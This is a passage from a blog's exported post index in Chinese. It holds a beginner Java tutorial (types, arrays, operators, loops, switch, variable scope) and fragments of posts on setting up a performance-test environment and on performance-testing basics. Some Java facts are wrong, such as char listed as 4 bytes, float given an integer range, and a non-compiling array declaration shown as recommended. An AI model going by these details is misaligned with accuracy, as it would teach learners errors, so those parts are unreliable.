用于区分程序中的各种基本成分 普通分隔符不能忽略，在程序中有确切的含义 常见的普通分割符 . 点：用于分割包、类、引用变量中的变量和方法 ; 分号：语句结束标志 : 冒号：说明语句符号 {} 大括号：定义类体、方法体、复合语句和数组初始化 [] 方括号：定义数组类型、引用数字的元素值 () 小括号：方法定义、方法访问中将参数括起来，或表达式中定义运算先后次序 变量概念 变量就是用来存储数据的，一个变量在程序中为一个标识符，在内存中是一块空间，提供了信息和数据临时存放的地方，具有记忆数据的功能 变量是可以被改变的，命名通常用小写字母开头的单词，驼峰命名方式 变量的三个元素：名称、类型和值 变量声明 在 Java 中存储一个数据，必须将其保存在一个变量中，变量在使用前必须有定义，即有确定的类型和名称 定义一个X变量，并赋值 4 给它：在数学中为 x=4 // Java 中定义变量一般写法 int x = 4 ; 此处 int 是变量类型，在 Java 这门语言中任何数据都是有类型的，所以变量前面需要声明变量的类型 上面这条语句告诉编译器给定义的数据类型和变量名建立一个变量 变量分类基本数据类型变量 Java 中有八大基本数据类型，按照类型来可以分成四类八种 注意事项：整型的字面值默认是int类型，声明 long 类型时后面加 L/l，浮点型的字面值默认是double类型声明 float 类型时后面加 F/f 在同一个作用于中不能有相同的变量名，遵循小驼峰命名规则 类别 数据类型 名称 字节 位长 缺省值 取值范围 举例说明 布尔型 布尔型 boolean 1 1 false true、false boolean b = true; 整型（整数） 字节型 byte 1 8 0 -2^7 - 2^7-1 byte aByte = 10; ~ 短整型 short 2 16 0 -2^15 - 2^15-1 short aShort = 10; ~ 整形 int 4 32 0 -2^31 - 2^31-1 int aInt = 1000; ~ 长整形 long 8 64 0 -2^63 - 2^63-1 long aLong = 10L; 字符型 字符型 char 4 32 ‘\\u0000’ ‘\\u0000’~’\\uffff’ char aChar = ‘c’; 浮点型（小数） 单精度 float 4 32 0.0 -2^31 - 2^31-1 float aFloat = 10.0F; ~ 双精度 double 8 64 0.0 -2^63 - 2^63-1 double aDouble = 10.0; 引用数据类型变量 引用类型（复合类型）的变量它就是指的一个内存地址，一个位置信息（相当于门牌号） 只想的内存中保存着变量所表示的一个值或一组值 引用数据类型分类 数组 类（类类型如String或自定义的类） 接口 枚举 常用数据类型类 类（类类型如String或自定义的类） 所有引用类型的默认值都是为 null 如果不初始化去引用就会报空指针异常 语法： // 定义一个字符串 String aString = \"helloword\"; 字符串类型的变量一般用来存储一串文字信息 字符串可以跟任意类型的数据进行拼接得到新的字符串，拼接符号为【+】例：”hello”+”word” 、”hello”+666 数组 概念：①数组是一种数据结构，它是一个容器，用来盛放数据 ②不同类型的数组可以盛放不同的数据类型 特点：①数组属于引用数据类型，使用的时候需要new 开辟内存空间的 ②数组的容量是确定的，也就是说在定义数组的时候必须指定数组的大小 ③数组的类型是确定的，也就是在定义数组的时候必须声明数组的类型，一种类型的数组只能放一种类型的数据 分类：一维数组，二维数组（Java 中没有二维数组的概念，是从 C中吸取的所以也这么叫了） 语法： 声明是直接开辟内存空间： // 语法一：数据类型 数组名称[] = new 数据类型[长度]; int ages[] = new int[65]; // 语法二(推荐使用，可读性高一点)：数据类型[] 数组名称 = new 数据类型[长度]; int[] ages2[] = new int[65]; 分布声明： /* 数据类型 数组名称[] = null; (声明) 数组名称 = new 数组类型[长度]; (实例化数组) */ int[] ages3 = null; ages3 = new int[50]; 静态声明 // 创建一个数组，并对内部的元素进行初始化 int[] myArr = {0,1,2,3,4}; 二维数组：二维数组是一个特殊的一维数组，里面的元素还是一个一维数组，二维数组可以不声明第二维度的长度 运算符运算符顺序 运算顺序 ++ – 括号 * / % + - 注意事项 同一优先级运算符顺序为从左至右 运算复杂的时候要一步步拆解运算 建议 不要把一个表达式写的过于复杂，可以分布来写 少使用优先级，可读性差 多使用（）来控制运算顺序 算数运算符双目运算符 算数运算符：双目运算符 单目运算符 三目运算符 一般的双目算数运算符有： + - * / *(取模) 单目运算符 一般的单目运算符有：++ – 单目运算符,操作数在左边先使用操作数，操作数在右边先运算 三目运算符 三目运算符 关系运算符 关系运算符又叫比较运算符 &gt; &lt; == != &gt;= &lt;= 逻辑运算符示例 &amp;(逻辑与) &amp;&amp;(短路与) |(逻辑或) ||(短路或) !(逻辑非，取反) 两种写法的结果一致 &amp;和&amp;&amp;的区别在于短路与中，当前面的计算就能得到结果时就不会执行后面的逻辑运算，|和||同理 &amp; &amp;&amp; 当两个同时满足结果才为真 | ||当有一个条件满足结果就为真 应用场景点击显/隐代码块 package com.tester.ada.operational; public class LogicOperatorTester { public static void main(String[] args) { // 登录场景 String phone = \"13888888888\"; String pwd = \"123456\"; // 登录成功条件：如果手机号长度是 11 位，并且密码长度是 6 位，就登录成功，否则提示账户信息错误 if(phone.length() == 11 &amp;&amp; pwd.length() == 6){ System.out.println(\"短路与——&gt;登录成功\"); }else { System.out.println(\"短路与——&gt;账户信息错误\"); } // 登录成功条件：如果手机号码长度不是 11 位，或者密码长度不是 6 位，提示账户信息错误 if(phone.length() != 11 || pwd.length() != 6){ System.out.println(\"短路或——&gt;账户信息错误\"); }else { System.out.println(\"短路或——&gt;登录成功\"); } } } 赋值运算符 等于 扩展的赋值运算符：+= -= *= /= %= 其它运算符循环控制结构常见的循环控制结构 任何变成语言的循环控制代码基本都是一样的 for while do…while 循环语句 在满足循环条件（布尔表达式）的情况下，反复的执行某段代码（循环体） 循环语句构成 初始化语句：初始化工作，在循环开始前执行 循环条件：布尔表达式，决定否是执行循环体 循环体：循环条件为真时执行的代码块 迭代语句：每次循环结束后，循环条件的变量，在核实的时候把循环条件设置为假，保证循环可以结束，从而避免死循环 while 与 do…while比较 区别 do…while…:先执行循环体，然后再判断循环条件，如果循环条件为真，进行下一次循环，否则终止循环，因此循环体里的代码至少执行一次，因为不管条件满不满足，它是先执行判断条件 while:先判断条件，条件为真才执行循环体 注意 do…while…:循环的循环条件必须有一个分号，表示循环结束 while语法while(条件){ // TODO }; while示例点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName WhileTester * @Description while 控制语句 * @Author ada * @Computer Mac mini * @Date 2021/12/10 15:13 */ public class WhileTester { public static void main(String[] args) { /** * 循环控制结构 * 1:初始化语句：int a = 1; 初始化一个变量，循环需要一个起点 * 2:循环条件：a &lt;= 100 控制是都要执行循环逻辑（循环体），条件为 true 执行循环，为 false 则结束循环 * 3:循环体：System.out.println(a); 需要循环去执行的逻辑 * 4:迭代语句：a++; 改变某些变量的值，让循环条件在适当的时候为假，从而结束循环，避免死循环 */ int a = 1; // 当 a 小于或等于 100 时输出 a while (a &lt;= 100) { System.out.println(a); // 当前为死循环，因为变量 A 未发生变化,只要 while 中间的条件值为真就会一直执行循环 a++; //让 a 发生变化，使条件语句变为假结束循环 } } } do…while…语法do{ //TODO } while(条件); do…while…示例点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName DoWhileTester * @Description do while 控制语句 * @Author ada * @Computer Mac mini * @Date 2021/12/10 15:31 */ public class DoWhileTester { public static void main(String[] args) { /** * 循环控制结构 * 1:初始化语句：int a = 1; 初始化一个变量，循环需要一个起点 * 2:循环条件：a &lt;= 100 控制是都要执行循环逻辑（循环体），条件为 true 执行循环，为 false 则结束循环 * 3:循环体：System.out.println(a); 需要循环去执行的逻辑 * 4:迭代语句：a++; 改变某些变量的值，让循环条件在适当的时候为假，从而结束循环，避免死循环 */ int a = 1; // 当 a 小于或等于 100 时输出 a do { System.out.println(a); a++; } while (a &lt;= 100); } } for 循环简介 for 循环是更为简介的循环语句 执行 for 循环时，先执行初始化语句（只执行一次） 执行循环体之前，先计算循环条件的值，如果为真，执行循环体 执行循环体结束，再执行迭代条件 for 循环的判断条件比循环体多执行一次 基本语法 for（int i = 1; i&lt;=10; i++）{ //i代表一个整数初始化语句 System.out.println(i); //打印变量 i 每次循环的值 } 语法解释 i 代表循环开始的值 第二个表达式“i &lt;= 10”代表的是循环下去的条件，只有满足条件，循环才会继续下去 i++ 代表走完一次循环，所以 i 要自增，避免死循环 三个表达式之间用“;”号来进行分割 普通 for 循环点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName ForLoopTesterBase * @Description 基础 for 循环练习 * @Author ada * @Computer Mac mini * @Date 2021/12/10 16:23 */ public class ForLoopTesterBase { public static void main(String[] args) { // for 求和 System.out.println(\"------------------------用 for 循环求 1-100 的和------------------------\"); int sum = 0; for (int i = 1; i &lt;= 100; i++) { sum = sum + i; System.out.println(\"当i为【\" + i + \"】时,sum则为【\" + sum + \"】\"); } // while 求和 System.out.println(\"------------------------用 while 循环求 1-100 的和------------------------\"); int a = 1; int sum2 = 0; while (a &lt;= 100) { sum2 = sum2 + a; System.out.println(\"当a为【\" + a + \"】时,sum2则为【\" + sum2 + \"】\"); a++; } } } 增强 for 循环点击显/隐代码块 package com.tester.ada.loopControl; import java.util.*; /** * @ClassName ForLoopTester * @Description for循环 * @Author ada * @Computer Mac mini * @Date 2021/12/10 15:37 */ public class ForLoopTester { public static void main(String[] args) { /** * 循环控制结构 * 1:初始化语句：int a = 1; 初始化一个变量，循环需要一个起点 * 2:循环条件：a &lt;= 100 控制是都要执行循环逻辑（循环体），条件为 true 执行循环，为 false 则结束循环 * 3:循环体：System.out.println(a); 需要循环去执行的逻辑 * 4:迭代语句：a++; 改变某些变量的值，让循环条件在适当的时候为假，从而结束循环，避免死循环 */ /** *语法 * for(初始化语句; 循环条件 ; 迭代语句){ * 循环体 * } */ for (int a = 0; a &lt;= 1000; a++) { System.out.println(a); } /** * 双重 for */ String[][] allNames = { {\"ada1\", \"test1\", \"base1\"}, {\"ada2\", \"test2\", \"base2\", \"git2\"}, {\"ada3\", \"test3\", \"base3\"} }; for (int i = 0; i &lt; allNames.length; i++) { String[] names = allNames[i]; for (int j = 0; j &lt; names.length; j++) { String name = names[j]; System.out.println(\"数组allNames【\" + i + \"】【\" + j + \"】的值为“\" + name + \"”\"); } } // JDK1.5增强 for 循环 /** * for(数据类型 变量名 : 遍历的变量){ * 循环体 * } */ for (String[] className : allNames ) { for (String name : className ) { System.out.println(name); } } // jdk1.8遍历 Map Lambda 表达式 Map&lt;String, Integer&gt; items = new HashMap&lt;&gt;(); items.put(\"test1\", 100); items.put(\"test2\", 200); items.put(\"test3\", 300); // 第一种简写式： items.forEach((k, v) -&gt; System.out.println(\"Key1: \" + k + \" Value1: \" + v)); // 第二种判断式： items.forEach((k, v) -&gt; { System.out.println(\"Key2: \" + k + \" Value2: \" + v); if (\"test2\".equals(k)) { System.out.println(v); } }); // jdk1.8遍历 List Lambda 表达式 List&lt;String&gt; alist = new ArrayList&lt;&gt;(); /* List&lt;String&gt; list= Lists.newArrayList();*/ //两种写法都可以 alist.add(\"ada1\"); alist.add(\"ada2\"); alist.add(\"ada3\"); alist.add(\"ada4\"); // 语法一 alist.forEach(item -&gt; System.out.println(item)); // 语法二 alist.forEach(System.out::println); // jdk1.8遍历数组 Lambda 表达式(通过Arrays.asList先转下) Integer[] integers = {1, 2, 3}; Arrays.asList(integers).forEach(integer -&gt; System.out.println(integer)); } } 三种循环比较 do while 循环次数 = 判断次数 while 循环次数 = 判断次数-1 for 循环次数 = 判断次数-1 点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName CompareTester * @Description 流程控制 * @Author ada * @Computer Mac mini * @Date 2021/12/10 16:08 */ public class CompareTester { public static void main(String[] args) { // do while 循环次数 = 判断次数 当 a 等于 500 先循环输出 a然后判断 a 不小于或等于 100循环结束，判断一次循环一次 int a = 500; do { System.out.println(a); a++; } while (a &lt;= 100); // while 循环次数 = 判断次数-1 当 b 等于 200，判断结果不小于或等于直接不进入循环 循环零次，判断一次 int b = 200; while (b &lt;= 100) { System.out.println(a); b++; } // for 循环次数 = 判断次数-1 当 i 等于 150，判断结果不小于或等于直接不进入循环 循环零次，判断一次 for (int i = 150; i &lt;=100 ; i++) { System.out.println(i); } } } continue关键字 conitue 跳过本次循环(忽略本次循环) 点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName ConitueTester * @Description Conitue 跳过本次循环(忽略本次循环) * @Author ada * @Computer Mac mini * @Date 2021/12/10 16:45 */ public class ConitueTester { public static void main(String[] args) { // 求 1-100 所有奇数的和 System.out.println(\"------------------------用 for 循环求 1-100 所有奇数的和------------------------\"); int sum = 0; for (int i = 1; i &lt;= 100; i++) { if (i % 2 == 1) { sum = sum + i; System.out.println(\"当i为【\" + i + \"】时,sum则为【\" + sum + \"】\"); } } System.out.println(\"------------------------用 while 循环求 1-100 所有奇数的和------------------------\"); int a = 1; int aSum = 0; while (a &lt;= 100) { if (a % 2 == 1) { aSum = aSum + a; System.out.println(\"当a为【\" + a + \"】时,aSum则为【\" + aSum + \"】\"); } a++; } // 求 1-100 的和，如果是偶数跳过 System.out.println(\"------------------------用 for 循环求 1-100 的和，如果是偶数跳过------------------------\"); int sum2 = 0; for (int j = 1; j &lt;= 100; j++) { if (j % 2 == 0) { continue; } sum2 = sum2 + j; System.out.println(\"当j为【\" + j + \"】时,sum2则为【\" + sum2 + \"】\"); } System.out.println(\"------------------------用 while 循环求 1-100 的和，如果是偶数跳过------------------------\"); int k = 1; int kSum = 0; while (k&lt;=100){ if (k%2==0){ k++; continue; } kSum=kSum+k; System.out.println(\"当K为【\" + k + \"】时,kSum2则为【\" + kSum + \"】\"); k++; } } } break关键字 break循环控制语句, 跳出整个循环（结束整个循环） 点击显/隐代码块 package com.tester.ada.loopControl; /** * @ClassName BreakTester * @Description break循环控制语句, 跳出整个循环（结束整个循环） * @Author ada * @Computer Mac mini * @Date 2021/12/10 16:50 */ public class BreakTester { public static void main(String[] args) { // for 当 a=55 时停止循环 break跳出 int sum = 0; for (int i = 1; i &lt;= 100; i++) { if (i == 55) { break; } sum = sum + i; System.out.println(\"当i为【\" + i + \"】时,sum则为【\" + sum + \"】\"); } // while 当 a=55 时停止循环 break跳出 int a = 1; int aSum = 0; while (a &lt;= 100) { if (a == 55) { break; } aSum = aSum + a; System.out.println(\"当a为【\" + a + \"】时,aSum则为【\" + aSum + \"】\"); a++; } } } 条件控制 条件控制语句又叫分支控制结构 常见的条件控制语句 if… if(条件1){ //如果条件1成立，则执行这里的代码,然后跳出代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 } if…else if… if(条件1){ //如果条件1成立，则执行这里的代码,然后跳出代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 }else if(条件2){ //如果条件2成立，则执行这里的代码,然后跳出代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 } if…else if…else if(条件1){ //如果条件1成立，则执行这里的代码,然后跳出代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 }else if(条件2){ //如果条件2成立，则执行这里的代码,然后跳出代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 }else{ //如果条件1和条件2都不成立，则执行这里的代码,然后跳出代码块 } switch 语句 switch有轮换的意思，针对 switch 里的变量a去匹配所有的 case 值，若匹配则执行相关 case 下的代码逻辑 case 代表一种情形 “:” 冒号表示若复合此种情形，后面就要执行的代码 break 有打破的意思，这里表述不再往下执行 default 表示若前面的 case 都没有满足条件，将要执行这里的代码 注意事项 switch 语句能够接受的变量类型时有限的，case 常用参数类型为：char byte short int String enum switch(变量a){ case A: //TODO break; case A: //TODO break; default: //TODO break; } 三目运算 int adaAge = 20; int linkAge = 20; // 三目运算: 条件 ? 条件为真执行 : 否则执行 // 需求:如果 ada 的年龄比 link 的大，输出 ada 是 link 的大哥，否则输出 ada 不是 link 的大哥 String result = adaAge &gt; linkAge ? \"1.ada是 link 的大哥\" : \"2.ada 不是 link 的大哥 \"; System.out.println(result); if 语法 注意事项 if…else if…else…代码块中至少有一个并且只能有一个 if，可以有多个或零个else if 最多有一个 else 或者零个 语句中只会进入一个分支满足执行完后就会跳出代码块，如示例中的 adaAge &gt; linkAge if 和 else if 都满足，第一个满足后执行完就会跳出整个分支代码块 语法中的条件表达式可以用 &amp; &amp;&amp; | || 进行多个条件组合 点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName IfConditional * @Description TODO * @Computer Macbook pro * @Date 2021/12/14 20:39 */ public class IfConditionalTester { public static void main(String[] args) { int adaAge = 20; int linkAge = 18; // 逻辑：如果 ada 的年龄比 link 的年龄大输出 ada 是 link 的大哥，否则如果 ada 的年龄比 link 的年龄小输出 link 是 ada 的大哥，否则 if (adaAge &gt; linkAge) { System.out.println(\"1.ada 是 link 的大哥\"); // 这个else if 条件也是满足的，不过上面的 if 满足了就直接跳出整个代码块了 } else if (adaAge &gt; linkAge) { System.out.println(\"2.ada 是 link 的大哥\"); } else if (linkAge &gt; adaAge) { System.out.println(\"3.ada 是 link 的大哥\"); } else { System.out.println(\"4.ada 和 link 同岁\"); } } } 点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName IfConditionalTester2 * @Description if 语法练习 * @Computer Macbook pro * @Date 2021/12/14 21:32 */ public class IfConditionalTester2 { public static void main(String[] args) { int dayInt = 3; // 需求：给我一个数字，告诉我今天是星期几 if (dayInt == 1) { System.out.println(\"今天是星期一\"); } else if (dayInt == 2) { System.out.println(\"今天是星期二\"); } else if (dayInt == 3) { System.out.println(\"今天是星期三\"); } else if (dayInt == 4) { System.out.println(\"今天是星期四\"); } else if (dayInt == 5) { System.out.println(\"今天是星期五\"); } else if (dayInt == 6) { System.out.println(\"今天是星期六\"); } else if (dayInt == 7) { System.out.println(\"今天是星期天\"); } else { System.out.println(\"数值不在范围内\"); } } } switch 语法switch 语法一点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName SwitchConditionalTester * @Description TODO * @Computer Macbook pro * @Date 2021/12/14 22:03 */ public class SwitchConditionalTester { public static void main(String[] args) { int day = 6; switch (day) { case 1: System.out.println(\"今天是星期一\"); break; case 2: System.out.println(\"今天是星期二\"); break; case 3: System.out.println(\"今天是星期三\"); break; case 4: System.out.println(\"今天是星期四\"); break; case 5: System.out.println(\"今天是星期五\"); break; case 6: System.out.println(\"今天是星期六\"); break; case 7: System.out.println(\"今天是星期天\"); break; default: System.out.println(\"数值不在范围内\"); } } } switch 语法二点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName SwitchConditionalTester * @Description TODO * @Computer Macbook pro * @Date 2021/12/14 22:03 */ public class SwitchConditionalTester { public static void main(String[] args) { int day = 5; switch (day) { case 1: case 2: case 3: case 4: case 5: System.out.println(\"今天是工作日\"); break; case 6: case 7: System.out.println(\"今天是休息日\"); break; default: System.out.println(\"数值不在范围内\"); } } } case 穿透点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName SwitchConditionalTester3 * @Description TODO * @Computer Macbook pro * @Date 2021/12/14 22:24 */ public class SwitchConditionalTester3 { public static void main(String[] args) { int day = 2; switch (day) { case 1: System.out.println(\"今天是星期一\"); break; case 2: System.out.println(\"今天是星期二\"); // 这里没有 break，出现 case 穿透 case 3: System.out.println(\"今天是星期三\"); case 4: System.out.println(\"今天是星期四\"); case 5: System.out.println(\"今天是星期五\"); case 6: System.out.println(\"今天是星期六\"); break; case 7: System.out.println(\"今天是星期天\"); break; default: System.out.println(\"数值不在范围内\"); } } } 三目运算符点击显/隐代码块 package com.tester.ada.conditionalControl; /** * @author ada * @ClassName ternaryOperatorTester * @Description TODO * @Computer Macbook pro * @Date 2021/12/14 22:38 */ public class ternaryOperatorTester { public static void main(String[] args) { int adaAge = 20; int linkAge = 20; // 三目运算: 条件 ? 条件为真执行 : 否则执行 // 需求:如果 ada 的年龄比 link 的大，输出 ada 是 link 的大哥，否则输出 ada 不是 link 的大哥 String result = adaAge &gt; linkAge ? \"1.ada是 link 的大哥\" : \"2.ada 不是 link 的大哥 \"; System.out.println(result); } } 变量的定义变量的分类 按数据类型 基本数据类型，四类八种 引用数据类型（复合数据类型）：String、数组 按数据范围 局部变量1：方法体中定义的变量，作用域从定义处到代码块的第一个} 局部变量2：形式参数（形参），作用在整个方法 局部变量3：代码块内的，在一个方法中有定义了一个代码块，{方法中的代码块}，这里的局部变量只能在定义处到代码块结束前 全局变量：在类中定义，也叫做成员变量、类属性、实体，作用域在定义处到类结束 静态的属性只能被静态的方法调用 全局变量的特点 有修饰符（public protected 默认修饰符 private） 在函数外部 作用域为整个类，随类或对象消亡时消亡 访问位置 private 默认修饰符 protected public 定义的类中 √ √ √ √ 同一个包中 × √ √ √ 子类中 × × √ √ 其它包中 × × × √ 注意事项：①局部变量必须被初始化 ②局部变量没有修饰符 ③全局变量可以不初始化，值为默认值（缺省值）④全局变量或对象没有初始化然后还去调用它的方法或属性会报空指针异常 比如一个 String aStr 类型的全局变量没有初始化，还去调用 aStr.length（）就会报空指针异常一个变量或对象还没初始化（已经为 null 了），就没有指向任何一块空间，这个时候你还要去访问它的属性或方法就要报空指针异常 ⑤如果局部变量和全局变量重名了，会采取就近原则访问局部变量，如果要访问全局变量用加用 ClassName.varName（建议一个类中不要去定义重名的变量名称，阅读性差） 变量定义及范围点击显/隐代码块 package com.tester.ada.variable; import java.util.stream.BaseStream; /** * @author ada * @ClassName VariableTester * @Description TODO * @Computer Macbook pro * @Date 2021/12/15 21:52 */ public class VariableTester { static String aStr = \"类中的静态全局变量\"; String dStr = \"类中的全局变量\"; public static void main(String[] args) { String bStr = \"main方法中的局部变量\"; System.out.println(bStr); System.out.println(aStr); System.out.println(cStr); // cStr 是 myFunction 中的局部变量，无法使用 System.out.println(dStr); // dStr 是类中的全局变量，无法在静态方法中使用非静态变量 } public void myFunction() { String cStr = \"myFunction 中的局部变量\"; System.out.println(cStr); System.out.println(bStr); // bStr 是 main 方法中的局部变量，无法使用 System.out.println(aStr); System.out.println(dStr); } }","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"Java 基础","slug":"Java-基础","permalink":"https://www.adalucky.com/tags/Java-%E5%9F%BA%E7%A1%80/"},{"name":"IDEA","slug":"IDEA","permalink":"https://www.adalucky.com/tags/IDEA/"}],"author":"Ada"},{"title":"性能测试环境搭建","slug":"Performance/性能测试环境搭建","date":"2021-09-09T03:57:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/performance/xing-neng-ce-shi-huan-jing-da-jian/","link":"","permalink":"https://www.adalucky.com/performance/xing-neng-ce-shi-huan-jing-da-jian/","excerpt":"本篇幅主要记录通过VMware和云服务器搭建性能测试的项目步骤，可参考进行搭建自己的项目（本项目为第三方提供的，因此不进行外发）","text":"本篇幅主要记录通过VMware和云服务器搭建性能测试的项目步骤，可参考进行搭建自己的项目（本项目为第三方提供的，因此不进行外发） 虚拟化技术服务器的发展 台式机—&gt;刀片机（通过vmwaer虚拟多个系统08年-15年）—&gt;云服务器 虚拟化技术vmwarevmwaer（08-15年）用vmware虚拟技术虚拟的操作系统,是非常消耗本机的硬件资源，用 vmware虛拟技术虛拟的机器,能产生多个操作系统,更大化使用本机资源,但是,Ⅶware也非常消耗资源,会使用大量的磁盘空间和cpu、内存资源。它对我们本机的性能是有影响,但是因为虚拟了多个操作系统,可以更大化利用空间 云服务器也是虚拟技术发展的产品,虚拟操作系统(比较完整的操作系统) dockerdocker（15 16年后开始,也是操作系统,定制化,缩减版的操作系统( namespace、 unionFS、 cgroup） VMware安装项目项目导入注意事项 通过vmware导出的操作系统iso文件为ova后缀文件，开机即可使用 安装 vmware软件、 virtualbox后一定要记得重启动电脑（防止虚拟网卡不生效） 查看网络连接里面一定要有wmet8必须是启用，部分windows电脑如果虚拟机系统上网有问题记得看下服务里面找到vm相关的网络服务要开启 Vmware工具,可以在 windows、 linux、mac中安装(版本可以是12以上都可以） 导入的时候需要选择存储路径(不要使用默认的系统盘路径) 导入第一次会报错,没有关系,点击重试 (function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"theme\":\"#FADFA3\",\"loop\":true,\"video\":{\"url\":\"http://blog.adalucky.com/mp4-20210527160039918.mp4\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 项目导入 启动 导入成功之后:编辑虚拟机设置 根据自己的机器配置,修改内存大小,cp的数量 网络适配器, vmware一定要选择NAT网络 virtualbox选择桥接网络 本项目jdk环境1.7，Tomcat8 MySQL5.7（docker部署的） 本项目登录信息默认账号root 密码123456 # 启动项目 sh /opt/tom.../bin/st...sh start #动态查看日志 tail -f catalina. out 个性化配置静态ip 静态ip配置的目的是为了固定我们项目的ip地址，这样不用后面去修改连接信息，但是可能会导致换了其它的网络虚拟机就没办法上网的问题 主要实现方法有2种 方案一配置路由器:路由器分配，登录路由器页面找到虚拟机的Mac地址进行分配静态ip—这种一般是接触不到我们的公司的路由的 方案二配置网卡文件(推荐) 参考：https://www.cnblogs.com/jasmine-Jobs/p/5928218.html 虚拟机需要选择桥接网络 需要指定宿主机使用的网卡 编辑配置文件 #进入配置文件 cd /etc/sysconfig/network-scripts #通过ls查看，把里面的ifcfg-enp0s3 改为ifcfg-ens33这里如果不改的话可能重启网卡的时候会报失败 mv ifcfg-enp0s3 ifcfg-ens33 #修改ens33 vim ifcfg-ens33 #配置静态ip和网关，dns等信息，wq保存退出 之前在这里踩过坑，很多网上复制出来的GATEWAY都少写了一个E（GATWAY）导致无法上外网 DNS1=114.114.114.114 #主DNS处理机 DNS2=8.8.8.8 #辅DNS处理机 IPADDR=192.168.1.169 #本机静态ip地址（网段根据路由器分配设定） PREFIX=24 #子网掩码位。24代表255.255.255.0 GATEWAY=192.168.1.1 #网关地址（路由器ip） (function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer1\"),\"theme\":\"#FADFA3\",\"loop\":true,\"video\":{\"url\":\"http://blog.adalucky.com/mp4-20210528151633.mp4\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 静态IP设置 开机自启动 通过开机启动Tomcat这样能比较方便一些，主要是配置一下rc.local文件 #修改rc.local vim /etc/rc.local #新增Tomcat开机自启动 touch /var/lock/subsys/local #这一行是自带的 export JAVA_HOME=/usr/local/java/jdk1.7.0_79 #根据java的系统自行配置， cat /etc/profile 命令查看 /opt/apache-tomcat-8.5.56/bin/startup.sh start #startup.sh文件的路径 start 注：内容针对centos7有效，如果centos8按照该方法无效可参考https://www.cnblogs.com/easonchean/p/14199088.html，centos8.2亲测有效 云服务器安装项目部署项目 这里只提供思路，不做展示了 1.将虚拟机内/opt下的所有文件打成压缩包上传到云服务器opt下，注意给bin文件夹下的文件赋予执行权限 2.把java1.7打包放在对应的文件夹下，并配置环境变量 3.执行install_docker_mysql57.sh文件 4.如果数据库等信息需要修改的话，可以到这里路径里面配置一下 配置开机自启可先尝试修改rc.local，我的是centos8无效，后面通过编写Tomcat.service成功参考网址：https://www.cnblogs.com/easonchean/p/14199088.html","categories":[{"name":"Performance","slug":"Performance","permalink":"https://www.adalucky.com/categories/Performance/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://www.adalucky.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"author":"Ada"},{"title":"性能测试基础知识","slug":"Performance/性能测试基础知识","date":"2021-09-08T15:46:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"/performance/xing-neng-ce-shi-ji-chu-zhi-shi/","link":"","permalink":"https://www.adalucky.com/performance/xing-neng-ce-shi-ji-chu-zhi-shi/","excerpt":"本篇幅主要对性能测试中的一些基础预备知识进行描述，其中包括专业名称、指标参数、历史发展、性能测试流程等作为一个简单的知识储备为后期的篇幅打下基础","text":"本篇幅主要对性能测试中的一些基础预备知识进行描述，其中包括专业名称、指标参数、历史发展、性能测试流程等作为一个简单的知识储备为后期的篇幅打下基础 概念和常识常识 功能或自动化测试目的：找bug预期结果与实际结果进行比对，模拟都是单个用户的操作 性能测试：模拟 多个人同时 操作时,查看响应时间，接口服务器性能测试中,一定是多个人同时操作,才是性能测试 响应时间基准：性能中的avgRT可接受的范围≤1500ms,APDEX用户满意度指数＝（1 × 满意样本 ＋ 0.5 × 容忍样本）÷ 样本总数 事务：一个请求行为,并不一定只有一个接口,所以事务可能是多个 ineterface，默认情况下,1个接口请求1次,认为一个1个事务 Transation。也可以是通过事务控制器,挂载多个接口请求，合并成为1个事务（在页面上输入账号密码后，点击登录，会触发多个接口，这些自动关联可合并为一个事务，多个事务可组成一个 workflow ） 并发 狭义的并发：同一时间请求同一事物（同一时间都在并发登陆，单场景） 广义的并发：同一时间请求不同事物（同一时间，有登陆，有注册，有浏览，有评论，有发呆） 在性能中，先狭义，再广义，先单接口，后混合场景，这样方便定位到问题 角色分析用户 用户只关心速度，请求的响应快不快，在不在可以接受的范围内，这个会直接影响到用户的体验 管理层 应用服务器/数据库服务器资源使用是否合理（资源利用率，资源不回收，泄露，cpu慢查询 系统能否实现可扩展 （可扩展性方面考虑，比如扩展一个新功能，服务，需要对代码大量更换，修改，甚至要全部重来，这种的扩展性就很差，或者不需要更改多少这种就比较好） 系统最大支持多少用户（系统容量，比如最多支持10w,100W用户，就支持不了了） 系统最大业务处理能力 tps(每秒服务器能够处理的请求数) 吞吐量是以KB每秒，或每秒的条数，属于tps的一种，qps一般是开发的称呼，是每秒查询的请求数 系统性能存在的瓶颈在哪里 定位到那个代码，或者哪个进程等等，或者是硬件的问题 更换哪些设备能够提高系统性能 cpu核数加大，硬盘等等，比如双11，618都是靠堆服务器 稳定性，能否支持7x24小时的业务访问（比如跑个几天就必须重启，或者8个小时，12个小时等等，先跑单接口，再跑多个请求混和场景） 开发人员 架构设计是否合理（系统架构图是架构师设计的，但是实现还是开发，有些情况可能根本不能实现） 数据库设计是否存在问题（数据库设计，监控是不是有慢查询） 代码是否存在性能问题（不同人写的代码方法，算法的复杂度不一样，导致性能处理也不一样） 